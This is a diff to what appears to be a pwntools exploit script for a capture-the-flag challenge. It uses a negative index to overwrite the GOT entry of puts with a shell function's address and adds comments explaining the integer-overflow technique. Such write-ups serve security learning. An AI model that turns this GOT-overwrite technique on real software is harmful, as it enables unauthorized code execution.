@@ -11,8 +11,11 @@ p = gdb.debug('./got', '''
 
 # p = remote('got-633f0940af5db06d.deploy.phreaks.fr', 443, ssl=True)
 
-p.sendlineafter(b'> ', str(-((0x404080-0x404008)//0x20+1)).encode())
-p.sendlineafter(b'> ', b'A'*0x8+p64(0x4012b8))
+# there is a integer overflow vulnerability in this challenge
+# with a negative index for a global variable in bss section, overwrite GOT table entry of puts to shell function
+
+p.sendlineafter(b"> ", str(-((0x404080-0x404008)//0x20+1)).encode())
+p.sendlineafter(b"> ", b'A'*8+p64(0x4012b8))
 
 p.interactive()
 
